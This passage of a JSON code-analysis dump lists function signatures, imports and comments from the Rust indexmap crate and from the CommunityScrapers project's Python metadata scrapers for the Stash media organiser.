        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/rustc.rs",
        "function_defs": [
          "fn into_par_iter(self) -> Self::Iter {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn into_par_iter(self) -> Self::Iter {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::vec::Vec;",
          "use crate::{Bucket, Entries, IndexMap, IndexSet};",
          "use rustc_rayon::iter::plumbing::{Consumer, ProducerCallback, UnindexedConsumer};",
          "use rustc_rayon::iter::{IndexedParallelIterator, IntoParallelIterator, ParallelIterator};",
          "use super::*;",
          "use super::*;"
        ],
        "macros": [
          "parallel_iterator_methods!(Bucket::key_value);",
          "indexed_parallel_iterator_methods!(Bucket::key_value);",
          "parallel_iterator_methods!(Bucket::refs);",
          "indexed_parallel_iterator_methods!(Bucket::refs);",
          "parallel_iterator_methods!(Bucket::ref_mut);",
          "indexed_parallel_iterator_methods!(Bucket::ref_mut);",
          "parallel_iterator_methods!(Bucket::key);",
          "indexed_parallel_iterator_methods!(Bucket::key);",
          "parallel_iterator_methods!(Bucket::key_ref);",
          "indexed_parallel_iterator_methods!(Bucket::key_ref);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/rayon/mod.rs",
        "function_defs": [
          "fn collect<I: IntoParallelIterator>(iter: I) -> LinkedList<Vec<I::Item>> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use rayon::prelude::*;",
          "use alloc::collections::LinkedList;",
          "use crate::vec::Vec;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/rayon/set.rs",
        "function_defs": [
          "fn into_par_iter(self) -> Self::Iter {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn par_drain<R: RangeBounds<usize>>(self, range: R) -> Self::Iter {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn drive_unindexed<C>(self, consumer: C) -> C::Result",
          "fn from_par_iter<I>(iter: I) -> Self",
          "fn par_extend<I>(&mut self, iter: I)",
          "fn par_extend<I>(&mut self, iter: I)",
          "fn insert_order() {",
          "fn partial_eq_and_eq() {",
          "fn extend() {",
          "fn comparisons() {",
          "fn iter_comparisons() {",
          "fn check<'a, I1, I2>(iter1: I1, iter2: I2)"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::collect;",
          "use rayon::iter::plumbing::{Consumer, ProducerCallback, UnindexedConsumer};",
          "use rayon::prelude::*;",
          "use crate::vec::Vec;",
          "use core::cmp::Ordering;",
          "use core::fmt;",
          "use core::hash::{BuildHasher, Hash};",
          "use core::ops::RangeBounds;",
          "use crate::Entries;",
          "use crate::IndexSet;",
          "use super::*;",
          "use std::iter::empty;"
        ],
        "macros": [
          "parallel_iterator_methods!(Bucket::key);",
          "indexed_parallel_iterator_methods!(Bucket::key);",
          "parallel_iterator_methods!(Bucket::key_ref);",
          "indexed_parallel_iterator_methods!(Bucket::key_ref);",
          "parallel_iterator_methods!(Bucket::key);",
          "indexed_parallel_iterator_methods!(Bucket::key);",
          "assert_eq!(set.par_iter().count(), set.len());",
          "assert_eq!(set.par_iter().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(set.get_index(i).unwrap(), v);",
          "assert!(set_a.par_eq(&set_b));",
          "assert!(!set_a.par_eq(&set_b));",
          "assert!(!set_a.par_eq(&set_b));",
          "assert!(!set_a.par_eq(&set_c));",
          "assert!(!set_c.par_eq(&set_a));",
          "assert_eq!(",
          "assert!(!set_a.par_is_disjoint(&set_a));",
          "assert!(set_a.par_is_subset(&set_a));",
          "assert!(set_a.par_is_superset(&set_a));",
          "assert!(set_a.par_is_disjoint(&set_b));",
          "assert!(set_b.par_is_disjoint(&set_a));",
          "assert!(!set_a.par_is_subset(&set_b));",
          "assert!(!set_b.par_is_subset(&set_a));",
          "assert!(!set_a.par_is_superset(&set_b));",
          "assert!(!set_b.par_is_superset(&set_a));",
          "assert!(!set_a.par_is_disjoint(&set_c));",
          "assert!(!set_c.par_is_disjoint(&set_a));",
          "assert!(set_a.par_is_subset(&set_c));",
          "assert!(!set_c.par_is_subset(&set_a));",
          "assert!(!set_a.par_is_superset(&set_c));",
          "assert!(set_c.par_is_superset(&set_a));",
          "assert!(!set_c.par_is_disjoint(&set_d));",
          "assert!(!set_d.par_is_disjoint(&set_c));",
          "assert!(!set_c.par_is_subset(&set_d));",
          "assert!(!set_d.par_is_subset(&set_c));",
          "assert!(!set_c.par_is_superset(&set_d));",
          "assert!(!set_d.par_is_superset(&set_c));",
          "assert_eq!(v1, v2);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/rayon/map.rs",
        "function_defs": [
          "fn into_par_iter(self) -> Self::Iter {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_par_iter(self) -> Self::Iter {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn par_drain<R: RangeBounds<usize>>(self, range: R) -> Self::Iter {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn clone(&self) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from_par_iter<I>(iter: I) -> Self",
          "fn par_extend<I>(&mut self, iter: I)",
          "fn par_extend<I>(&mut self, iter: I)",
          "fn insert_order() {",
          "fn partial_eq_and_eq() {",
          "fn extend() {",
          "fn keys() {",
          "fn values() {",
          "fn values_mut() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::collect;",
          "use rayon::iter::plumbing::{Consumer, ProducerCallback, UnindexedConsumer};",
          "use rayon::prelude::*;",
          "use crate::vec::Vec;",
          "use core::cmp::Ordering;",
          "use core::fmt;",
          "use core::hash::{BuildHasher, Hash};",
          "use core::ops::RangeBounds;",
          "use crate::Bucket;",
          "use crate::Entries;",
          "use crate::IndexMap;",
          "use super::*;",
          "use std::string::String;"
        ],
        "macros": [
          "parallel_iterator_methods!(Bucket::key_value);",
          "indexed_parallel_iterator_methods!(Bucket::key_value);",
          "parallel_iterator_methods!(Bucket::refs);",
          "indexed_parallel_iterator_methods!(Bucket::refs);",
          "parallel_iterator_methods!(Bucket::ref_mut);",
          "indexed_parallel_iterator_methods!(Bucket::ref_mut);",
          "parallel_iterator_methods!(Bucket::key_value);",
          "indexed_parallel_iterator_methods!(Bucket::key_value);",
          "parallel_iterator_methods!(Bucket::key_ref);",
          "indexed_parallel_iterator_methods!(Bucket::key_ref);",
          "parallel_iterator_methods!(Bucket::value_ref);",
          "indexed_parallel_iterator_methods!(Bucket::value_ref);",
          "parallel_iterator_methods!(Bucket::value_mut);",
          "indexed_parallel_iterator_methods!(Bucket::value_mut);",
          "assert_eq!(map.par_keys().count(), map.len());",
          "assert_eq!(map.par_keys().count(), insert.len());",
          "assert_eq!(a, b);",
          "assert_eq!(map.get_index(i).unwrap().0, k);",
          "assert!(map_a.par_eq(&map_b));",
          "assert!(!map_a.par_eq(&map_b));",
          "assert!(!map_a.par_eq(&map_b));",
          "assert!(!map_a.par_eq(&map_c));",
          "assert!(!map_c.par_eq(&map_a));",
          "assert_eq!(",
          "assert_eq!(keys.len(), 3);",
          "assert!(keys.contains(&1));",
          "assert!(keys.contains(&2));",
          "assert!(keys.contains(&3));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&'a'));",
          "assert!(values.contains(&'b'));",
          "assert!(values.contains(&'c'));",
          "assert_eq!(values.len(), 3);",
          "assert!(values.contains(&2));",
          "assert!(values.contains(&4));",
          "assert!(values.contains(&6));"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/map/core.rs",
        "function_defs": [
          "fn get_hash<K, V>(entries: &[Bucket<K, V>]) -> impl Fn(&usize) -> u64 + '_ {",
          "fn equivalent<'a, K, V, Q: ?Sized + Equivalent<K>>(",
          "fn erase_index(table: &mut RawTable<usize>, hash: HashValue, index: usize) {",
          "fn update_index(table: &mut RawTable<usize>, hash: HashValue, old: usize, new: usize) {",
          "fn clone(&self) -> Self {",
          "fn clone_from(&mut self, other: &Self) {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn into_entries(self) -> Vec<Self::Entry> {",
          "fn as_entries(&self) -> &[Self::Entry] {",
          "fn as_entries_mut(&mut self) -> &mut [Self::Entry] {",
          "fn with_entries<F>(&mut self, f: F)",
          "fn reserve_entries(&mut self) {",
          "fn push(&mut self, hash: HashValue, key: K, value: V) -> usize {",
          "fn shift_remove_finish(&mut self, index: usize) -> (K, V) {",
          "fn decrement_indices(&mut self, start: usize, end: usize) {",
          "fn increment_indices(&mut self, start: usize, end: usize) {",
          "fn swap_remove_finish(&mut self, index: usize) -> (K, V) {",
          "fn erase_indices(&mut self, start: usize, end: usize) {",
          "fn rebuild_hash_table(&mut self) {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn assert_send_sync() {",
          "fn assert_send_sync<T: Send + Sync>() {}"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use hashbrown::raw::RawTable;",
          "use crate::vec::{Drain, Vec};",
          "use core::cmp;",
          "use core::fmt;",
          "use core::mem::replace;",
          "use core::ops::RangeBounds;",
          "use crate::equivalent::Equivalent;",
          "use crate::util::simplify_range;",
          "use crate::{Bucket, Entries, HashValue};",
          "use rayon::iter::ParallelDrainRange;"
        ],
        "macros": [
          "debug_assert!(erased);",
          "assert!(at <= self.entries.len());",
          "debug_assert_eq!(self.indices.len(), start + shifted);",
          "Entry::Vacant(ref v) => f.debug_tuple(stringify!(Entry)).field(v).finish(),",
          "Entry::Occupied(ref o) => f.debug_tuple(stringify!(Entry)).field(o).finish(),",
          "f.debug_struct(stringify!(OccupiedEntry))",
          "f.debug_tuple(stringify!(VacantEntry))"
        ],
        "derives": [],
        "error_handling": 19
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-1.9.3/src/map/core/raw.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn find_index(&self, index: usize) -> RawBucket {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl fmt::Debug for DebugIndices<'_> {"
        ],
        "uses": [
          "use super::{equivalent, Bucket, Entry, HashValue, IndexMapCore, VacantEntry};",
          "use core::fmt;",
          "use core::mem::replace;",
          "use hashbrown::raw::RawTable;"
        ],
        "macros": [
          "assert!(indices.capacity() - indices.len() >= entries.len());"
        ],
        "derives": [],
        "error_handling": 1
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/# 2/Stash/external/CommunityScrapers",
    "name": "CommunityScrapers",
    "languages": [
      "Python",
      "Ruby",
      "TypeScript",
      "JavaScript"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AdultTime/AdultTime.py",
        "docstrings": [],
        "function_defs": [
          "def url_title_from_path(path: str) -> str:\n\"\"\"\nExtracts the url_title part of a URI path\n\"\"\"",
          "def sitename_from_url(_url: str) -> str | None:\n\"\"\"\nExtracts the sitename part of a URI path\n\"\"\"",
          "def preview_urls(urls: list[str]) -> list[str]:\n\"\"\"\nsome sites have scene preview pages using the url_title as the path, e.g.\n- https://adulttimepilots.com/Expose-Her-Therapy/\n- https://daddysboy.org/A-Bets-A-Bet-Pop/\n- https://dareweshare.net/Thats-Good-Teamwork/\n\"\"\"",
          "def _is_valid_url(_url: str, highest_status_code: int = 299):\n\"\"\"\nChecks if an URL is valid by making a HEAD request and ensuring the response status code is\nacceptable (defaults to 200-299, can supply highest_status_code to allow redirects,\ne.g. 308 will allow 200-308)\n\"\"\"",
          "def fix_url(_url: str) -> str:\n\"\"\"\nReplaces the host part of the URL if criteria matched\n\"\"\"",
          "def determine_studio(api_object: dict[str, Any]) -> str | None:\n\"\"\"\nDetermine studio name from API object properties to use instead of the\n`studio_name` property scraped by default\n\"\"\"",
          "def process_action_tags(action_tags: list[dict[str, str | int]]) -> None:\n\"\"\"\naction_tags is a list of {\"name\": str, \"timecode\": int}\n\nYou could use this to add markers via GraphQL\n\"\"\"",
          "def postprocess_scene(scene: ScrapedScene, api_scene: dict[str, Any]) -> ScrapedScene:\n\"\"\"\nApplies post-processing to the scene\n\"\"\"",
          "def postprocess_movie(movie: ScrapedMovie, api_movie: dict[str, Any]) -> ScrapedMovie:\n\"\"\"\nApplies post-processing to the movie\n\"\"\"",
          "def postprocess_gallery(gallery: ScrapedGallery, api_gallery: dict[str, Any]) -> ScrapedGallery:\n\"\"\"\nApplies post-processing to the gallery\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import re",
          "import sys",
          "from typing import Any",
          "from urllib.error import URLError",
          "from urllib.parse import urlparse",
          "from urllib.request import Request, urlopen",
          "from AlgoliaAPI.AlgoliaAPI import (",
          "from py_common import log",
          "from py_common.types import ScrapedGallery, ScrapedMovie, ScrapedScene",
          "from py_common.util import dig, scraper_args"
        ],
        "comments": [
          "# vivid.com",
          "# if the site does not have a real/working domain",
          "# for any other host, check if there is a website",
          "# determine studio override with custom logic",
          "# steps through from api_scene[\"availableOnSite\"], and picks the first match",
          "# most scenes have the studio name as the main channel name",
          "# add some code here to use the action_tags data",
          "# just return without doing anything for now",
          "# override the image for Devils Film scenes"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/Algolia/Algolia.py",
        "docstrings": [],
        "function_defs": [
          "def clean_text(details: str) -> str:\n\"\"\"\nremove escaped backslashes and html parse the details text\n\"\"\"",
          "def send_request(url: str, head: dict, send_json=\"\") -> requests.Response:\n\"\"\"\nget post response from url\n\"\"\"",
          "def apikey_get(site_url, time):",
          "def fetch_page_json(page_html):",
          "def check_config(domain, time):",
          "def write_config(date, app_id, api_key):",
          "def api_search_req(type_search, query, url):",
          "def api_search_id(scene_id, url):",
          "def api_search_movie_id(m_id, url):",
          "def api_search_gallery_id(p_id, url):",
          "def api_search_query(index_name, query, url):",
          "def json_parser(search_json, range_duration=60, single=False, scene_id=None):",
          "def match_result(api_scene, range_duration=60, single=False, clip_id: str=None):",
          "def get_id_from_url(url: str) -> str | None:",
          "def parse_movie_json(movie_json: dict) -> dict:\n\"\"\"\nprocess an api movie dictionary and return a scraped one\n\"\"\"",
          "def determine_studio_name_from_json(some_json):",
          "def parse_scene_json(scene_json, url=None):\n\"\"\"\nprocess an api scene dictionary and return a scraped one\n\"\"\"",
          "def parse_gallery_json(gallery_json: dict, url: str = None) -> dict:\n\"\"\"\nprocess an api gallery dictionary and return a scraped one\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import datetime",
          "import difflib",
          "import json",
          "import os",
          "import re",
          "import sys",
          "import base64",
          "from configparser import ConfigParser, NoSectionError",
          "from urllib.parse import urlparse",
          "from py_common.deps import ensure_requirements",
          "from py_common import graphql",
          "from py_common import log",
          "from py_common.config import get_config",
          "from bs4 import BeautifulSoup as bs  # noqa: E402",
          "import requests  # noqa: E402"
        ],
        "comments": [
          "#",
          "# User variables",
          "#",
          "# File to store the Algolia API key.",
          "# Extra tag that will be added to the scene",
          "# Include non female performers",
          "# a list of main channels (`mainChannelName` from the API) to use as the studio",
          "# name for a scene",
          "# a dict with sites having movie sections",
          "# used when populating movie urls from the scene scraper",
          "# a dict of serie (`serie_name` from the API) which should set the value",
          "# for the studio name for a scene",
          "# a list of serie (`serie_name` from the API) which should use the sitename",
          "# for the studio name for a scene",
          "# a dict of sites (`sitename_pretty` from the API) which should set the value",
          "# for the studio name for a scene",
          "# this is because the `serie_name` is the Movie (series) title on these sites,",
          "# not the studio",
          "# a list of sites (`sitename_pretty` from the API) which should pick out the",
          "# `sitename_pretty` for the studio name for a scene",
          "# this is because the `serie_name` is the Movie (series) title on these sites,",
          "# not the studio",
          "# a list of sites (`sitename_pretty` from the API) which should pick out the",
          "# `network_name` for the studio name for a scene",
          "# this is because the `serie_name` is the Movie (series) title on these sites,",
          "# not the studio",
          "# Some sites lists scenes from different subnetworks and uses mainChannel as studio",
          "# Good example is asgmax.com.",
          "# a list of networks (`network_name` from the API) which should pick out the",
          "# `sitename_pretty` for the studio name for a scene",
          "# a dict of directors to use as the studio for a scene",
          "# Remove leading/trailing/double whitespaces",
          "#log.debug(f\"Returned URL: {response.url}\")",
          "#print(response.text, file=open(\"algolia_request.html\", \"w\", encoding='utf-8'))",
          "# API Authentification",
          "# Write key into a file",
          "# API Search Data",
          "# Searching Result",
          "# Just for not printing the full JSON in log...",
          "# Url should be more accurate than the title",
          "# Engine whoaaaaa",
          "# A = ByID/Most likely | S = Size | D = Duration | N = Network | R = Only Ratio",
          "#",
          "# Using database",
          "# Post process things",
          "#log.debug(\"API Sitename: {}\".format(api_scene[\"sitename\"]))",
          "#log.debug(\"API Network: {}\".format(api_scene[\"network_name\"]))",
          "# Matching ratio",
          "# Rank search result",
          "#debug(\"[MATCH] {} - {}\".format(api_title,match_dict))",
          "# dates don't seem to be accurate (modifed multiple times by studio)",
          "# using date_created as default and we later override for each site when needed",
          "# Title",
          "# Date",
          "# Details",
          "# Studio Code",
          "# Director",
          "# Studio",
          "# Performer",
          "# Tags",
          "# Append content_tags to list_tag",
          "# Image",
          "# URL",
          "# Movie",
          "#log.debug(f\"{scrape}\")",
          "# Title",
          "# Date",
          "# Details",
          "# Studio Code # not yet supported in stash",
          "#if gallery_json.get('set_id'):",
          "#    scrape['code'] = str(gallery_json['set_id'])",
          "# Director # not yet supported in stash",
          "#directors = []",
          "#if gallery_json.get('directors') is not None:",
          "#    for director in gallery_json.get('directors'):",
          "#        directors.append(director.get('name').strip())",
          "#scrape[\"director\"] = \", \".join(directors)",
          "# Studio",
          "# Performer",
          "# Tags",
          "# Append content_tags to list_tag",
          "# URL",
          "#",
          "# Start processing",
          "#",
          "# log.trace(f\"fragment: {FRAGMENT}\")",
          "# ACCESS API",
          "# Check existing API keys",
          "# Getting new key",
          "# Failed to get new key",
          "#log.debug(HEADERS)",
          "#log.debug(FRAGMENT)",
          "# Get your sqlite database",
          "# getting your database from the config.yml",
          "# Get data by GraphQL",
          "# Extract things",
          "# Filter title",
          "# Remove resolution",
          "# Remove Date",
          "# Time to search the API",
          "# sceneByName",
          "# Scraping the JSON",
          "#log.debug(scraped_movie)",
          "# log.debug(f\"[API] Search gives {len(api_search_response)} result(s)\")",
          "# log.trace(f\"api_search_response: {api_search_response}\")",
          "#log.debug(gallery[0])",
          "#log.debug(scraped_gallery)",
          "# log.debug(f\"[API] Searching using SCENE_TITLE: {SCENE_TITLE}\")",
          "# log.trace(f\"api_search: {api_search}\")",
          "# Scraping the JSON"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 16,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AlgoliaAPI/AlgoliaAPI.py",
        "docstrings": [],
        "function_defs": [
          "def slugify(text: str) -> str:",
          "def headers_for_homepage(homepage: str) -> dict[str, str]:",
          "def api_auth_cache_write(site: str, app_id: str, api_key: str):",
          "def api_auth_cache_read(site: str) -> tuple[str, str] | tuple[None, None]:",
          "def get_api_auth(site: str) -> tuple[str, str]:",
          "def homepage_url(site: str) -> str:",
          "def clean_text(details: str) -> str:",
          "def get_search_client(site: str) -> SearchClientSync:",
          "def default_postprocess(obj: T, _) -> T:",
          "def parse_gender(gender: str) -> str:",
          "def movie_cover_image_url(cover_path: str, position: Literal[\"front\", \"back\"]) -> str:",
          "def gallery_url(site: str, url_title: str, set_id: str) -> str:",
          "def performer_url(site: str, url_name: str, actor_id: str) -> str:",
          "def movie_url(site: str, url_title: str, movie_id: str) -> str:",
          "def scene_url(site: str, sitename: str, url_title: str, clip_id: str) -> str:",
          "def to_scraped_performer(performer_from_api: dict[str, Any], site: str) -> ScrapedPerformer:",
          "def site_from_url(_url: str) -> str:",
          "def id_from_url(_url: str) -> str | None:",
          "def movie_from_api_scene(scene_from_api: dict[str, Any], site: str) -> ScrapedMovie:",
          "def scene_urls(scene_from_api: dict[str, Any]) -> list[str] | None:",
          "def largest_scene_image(scene_from_api: dict[str, Any]) -> str | None:",
          "def to_scraped_scene(scene_from_api: dict[str, Any], site: str) -> ScrapedScene:",
          "def name_values_as_csv(objects: list[dict[str, Any]]) -> str:",
          "def name_values_as_list(objects: list[dict[str, Any]]) -> list[str]:",
          "def actors_to_performers(actors: list[dict[str, Any]], site: str) -> list[ScrapedPerformer]:",
          "def scalar_match(scalar_candidate: int | float, scalar_reference: int | float) -> float:",
          "def add_scene_match_metadata(",
          "def sort_api_scenes_by_match(",
          "def api_scene_from_id(",
          "def scene_from_id(",
          "def gallery_from_scene_id(",
          "def scene_from_url(",
          "def scene_url_from_photoset(photoset_from_api: dict[str, Any], site: str) -> str | None:",
          "def to_scraped_gallery(api_hit: dict[str, Any], site: str) -> ScrapedGallery | None:",
          "def gallery_from_set_id(",
          "def gallery_from_url(",
          "def performer_from_url(",
          "def movie_cover_image_urls(",
          "def to_scraped_movie(movie_from_api: dict[str, Any], site: str) -> ScrapedMovie:",
          "def movie_from_url(",
          "def add_actor_match_metadata(",
          "def sort_api_actors_by_match(",
          "def performer_search(",
          "def scene_search(",
          "def add_photoset_match_metadata(",
          "def sort_api_photosets_by_match(",
          "def gallery_search(",
          "def scene_from_fragment(",
          "def gallery_from_fragment(",
          "def performer_from_fragment("
        ],
        "class_defs": [],
        "imports": [
          "from base64 import b64decode, b64encode",
          "import configparser",
          "from difflib import SequenceMatcher",
          "import json",
          "import os",
          "import re",
          "import sys",
          "from time import time",
          "from typing import Any, Callable, Literal, TypeVar",
          "from urllib.parse import urlparse",
          "from zipfile import ZipFile",
          "from py_common import graphql, log",
          "from py_common.deps import ensure_requirements",
          "from py_common.types import ScrapedGallery, ScrapedMovie, ScrapedPerformer, ScrapedScene",
          "from py_common.util import dig, guess_nationality, is_valid_url, scraper_args",
          "from algoliasearch.search.client import SearchClientSync",
          "from algoliasearch.search.config import SearchConfig",
          "from bs4 import BeautifulSoup as bs",
          "import requests",
          "from the scraper YAML (array items)",
          "from the result of the scene-by-name search",
          "from the result of the performer-by-name search"
        ],
        "comments": [
          "# attempt to get cached API auth",
          "# make a request to the site's homepage to get API Key and Application ID",
          "# extract JSON",
          "# replace breaks with newlines",
          "# don't strip to preserve newlines",
          "# don't add additional newlines",
          "# for studio name overrides, see EvilAngel.py or AdultTime.py for examples",
          "# log out scene number",
          "# it may be possible to populate the Scene Number field in the stash scene via a hook",
          "# or something, but for now just log it out as an editing aid",
          "# scenes _can_ include photoset_id and photoset_url_title",
          "# photosets have set_id and url_title",
          "# photosets have their own cover image",
          "# just log this out, to aid user in selecting the cover image",
          "# Get API auth and initialise client"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 8,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AMAMultimedia/scrape.py",
        "docstrings": [],
        "function_defs": [
          "def to_scraped_studio(raw_scene: dict) -> ScrapedStudio:",
          "def to_scraped_performer(dict: dict) -> ScrapedPerformer:",
          "def to_scraped_tag(tag: str) -> ScrapedTag:",
          "def get_urls(raw_scene: dict) -> list[str]:",
          "def to_scraped_scene(raw_scene: dict) -> ScrapedScene | None:",
          "def scene_from_url(url) -> ScrapedScene | None:",
          "def find_scene(query: str) -> ScrapedScene | None:",
          "def scene_search(query: str) -> list[ScrapedScene]:"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "from typing import Literal",
          "import requests",
          "from datetime import datetime",
          "from urllib.parse import urlparse",
          "import py_common.log as log",
          "from py_common.util import dig, scraper_args",
          "from py_common.types import ScrapedScene, ScrapedPerformer, ScrapedStudio, ScrapedTag"
        ],
        "comments": [
          "# PornPros appears to only feature cis performers",
          "# Some scenes are available on multiple sites and some have different domains",
          "# than their API metadata indicate so we map some of them manually"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 5,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AnalVids/AnalVids.py",
        "docstrings": [],
        "function_defs": [
          "def debug(t):",
          "def query_url(query):",
          "def detect_delimiter(title):",
          "def find_scene_id(title):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import sys",
          "import re",
          "from pathlib import Path",
          "import requests"
        ],
        "comments": [
          "# Remove file extension"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/CommunityScrapers/scrapers/AnimeCharactersDatabase/AnimeCharactersDatabase.py",
        "docstrings": [],
        "function_defs": [
          "def readJSONInput():",
          "def scrapeURL(url):",
          "def scrapeUrlToString(url):",
          "def performerByName(query):",
          "def addFranchise(query, results):",
          "def apiGetCharacter(id):",
          "def performerByURL(url, result={}):",
          "def parse_left(field):",
          "def parse_right(field):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import os",
          "import re",
          "import sys",
          "from datetime import datetime",
          "import cloudscraper",
          "import requests",
          "from lxml import html",
          "import py_common.log as log"
        ],
        "comments": [
          "# to import from a parent directory we need to add that directory to the system path",
          "#  --------------------------------------",
          "# This is a scraper for: animecharactersdatabase.com",
          "#",
          "# AnimeCharactersDatabase includes characters from:",
          "# Anime, Hentai, (Mobile) Games, Eroge, Virtual Idols/YouTubers, Vocaloid",
          "#",
          "# These fields will be populated if available:",
          "# Name, Gender, Birthdate, Country, Hair Color, Eye Color, Height, Measurements, URL, Details, Tags, Image",
          "#",
          "# A number of additional tags can be configured below.",
          "# ---------------------------------------",
          "# ---------- Tag Configuration ----------",
          "# ---------------------------------------",
          "# Maximum number of search results (between 1 and 30).",
          "# Search by name includes the franchise for each result to make it easier to choose the correct one.",
          "# Some (non ascii, very short) names require querying the API individually to get the franchise for each result.",
          "# This might get you banned, since the API is rate limited.",
          "# See: http://wiki.animecharactersdatabase.com/index.php?title=API_Access",
          "# Prefix for performer tags.",
          "# List of additional tags.",
          "# Tags mostly include appearance indicators like: ahoge, dress, hat, twintails, etc.",
          "# Scrape the source material as tag (name of anime/game): Kantai Collection, Idolmaster: Cinderella Girls, etc.",
          "# Scrape Zodiac Sign as tag: Libra \u264e, Sagittarius \u2650, etc.",
          "# Scrape race of non-human characters as tag: Orc, Elf, etc.",
          "# Scrape ship class of ship girls as tag (kancolle, etc.): Destroyer, etc.",
          "# Scrape blood type as tag: A, B, etc.",
          "# Scrape apparent age as tag: Adult, Teen, etc.",
          "# Might differ from canonical age.",
          "# Canonical age will be ignored, since it would result in too many tags.",
          "# Birthdate is sometimes available, but the resulting calculated age represents neither canonical age nor apparent age.",
          "# Scrape Hair Length as tag: To Shoulders, To Neck, Past Waist, etc.",
          "# ---------------------------------------",
          "# ---------------------------------------",
          "# ---------------------------------------",
          "# Try to find the franchise in API search results.",
          "# These results are ordered by alphabet and limited to 100,",
          "# so short queries might not include the correct result.",
          "# The API query also does not seem to support any Kanji.",
          "# Use separate API calls as a backup.",
          "# This might get you banned, since the API is rate limited.",
          "# Append franchise to character name for easier differentiation.",
          "# left table, works for link and plain text fields, return result list",
          "# middle/right table, reverse result list to prefer official appearance, return result or empty string",
          "# should be tagged anyway if yes",
          "# if parse_right(\"Animal Ears\") == \"Yes\":",
          "#     result[\"tags\"] += [{\"name\": \"performer:animal ears\"}]",
          "# read the input"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 7,
        "error_handling": 10,
        "decorators": []
      },
      {
